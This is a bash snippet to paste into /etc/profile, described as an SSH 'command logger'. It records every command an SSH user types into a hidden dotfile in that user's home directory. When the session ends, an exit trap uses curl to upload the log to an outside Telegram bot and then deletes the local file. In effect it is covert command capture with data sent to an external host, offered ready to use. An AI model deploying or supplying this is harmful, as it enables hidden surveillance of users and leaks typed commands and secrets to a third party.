# Paste this at the botton of /etc/profile 

# === GLOBAL COMMAND LOGGER FOR SSH SESSIONS (USER HOME VERSION) ===

# Only run if connected via SSH and interactive
if [ -n "$SSH_CONNECTION" ] && [[ "$-" == *i* ]]; then

  # === CONFIGURATION ===
  BOT_TOKEN="YOUR_BOT_TOKEN"
  CHAT_ID="YOUR_CHAT_ID"

  # Define a hidden directory in the user's home
  USER_HIDDEN_DIR="$HOME/.cache/.audit_logs"
  mkdir -p "$USER_HIDDEN_DIR"

  # Unique logfile per session
  SESSION_ID=$(date +%s)-$RANDOM
  LOG_FILE="$USER_HIDDEN_DIR/.session_${USER}_${SESSION_ID}.log"
  HOSTNAME=$(hostname)

  # Force environment
  export HISTFILE="$LOG_FILE"
  export HISTSIZE=10000
  export HISTFILESIZE=10000
  export HISTCONTROL=ignoredups
  export HISTTIMEFORMAT="%Y-%m-%d %H:%M:%S "
  set -o history

  # Real-time logging
  export PROMPT_COMMAND='history 1 | { read x cmd; echo "$(date "+%Y-%m-%d %H:%M:%S") [$USER@$HOSTNAME] $cmd" >> '"$LOG_FILE"'; }'

  # Trap to send log after logout
  trap ' 
    DATE_END=$(date "+%Y-%m-%d %H:%M:%S %Z")
    curl -s -F "chat_id='$CHAT_ID'" -F "document=@$LOG_FILE" \
         -F "caption=📄 SSH Session Ended
User: $USER
Hostname: $HOSTNAME
End Time: $DATE_END" \
         "https://api.telegram.org/bot$BOT_TOKEN/sendDocument" \
         > /dev/null 2>&1
    rm -f "$LOG_FILE"
  ' EXIT

fi
